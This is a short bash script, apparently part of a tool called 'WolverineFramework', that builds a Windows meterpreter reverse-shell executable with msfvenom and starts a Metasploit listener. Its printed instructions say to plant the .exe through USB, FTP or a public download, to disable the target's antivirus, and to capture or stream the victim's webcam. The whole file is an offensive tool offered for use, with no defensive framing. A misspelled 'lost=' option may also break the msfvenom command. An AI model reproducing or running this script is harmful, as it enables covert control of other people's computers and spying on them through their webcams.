#!/bin/bash

lhost=$(hostname -I | awk '{print $1}')
    mkdir exeFiles
    echo "Your IP address is :" $lhost
    echo "Which port do you want to use ?"
    read -p "WolverineFramework - Port> " lport
    echo "What name do you want to give to the .exe file ? (don't put .exe)"
    read -p "WolverineFramework - File Name> " extension
    echo "Creating .exe file..."
    msfvenom -p windows/x64/meterpreter/reverse_tcp lost=$lhost lport=$lport -f exe > $extension.exe
    mv $extension.exe exeFiles
    echo "Once it's done, I advise you to take the .exe file with an USB key or by FTP/SFTP, so you can put it on a Windows Computer, or put it on the Internet to  make it downloadable,
but, the .exe file is very detectable, so don't forget to disable the antivurus present on the computer."
    echo ""
    echo "Once you've finished and launched the .exe on a Windows computer, use those commands on metasploit :"
    echo ""
    tput setaf 2
    echo "use exploit/multi/handler"
    echo ""
    echo "set payload windows/x64/meterpreter/reverse_tcp"
    echo ""
    tput setaf 7
    echo "One that's done, you have to type by yourself the lhost and lport, with the port and ip address that you wrote on the .exe file (port : $lport, ip : $lhost)"
    echo ""
    echo "Use this commands :"
    echo ""
    tput setaf 2
    echo "set lhost $lhost"
    echo ""
    echo "set lport $lport"
    echo ""
    tput setaf 7
    echo "Once all of this is done, you just have to lauch the exploit by typing run or exploit and that's it, to take a pic with the webcam, type webcam_snap, and if you want to record the webcam, type webcam_stream, for others commands, type help"
    echo ""
    echo "Launching Metasploit-Framework, please wait..."
    echo ""
    sudo service postgresql start
    sudo msfconsole -q
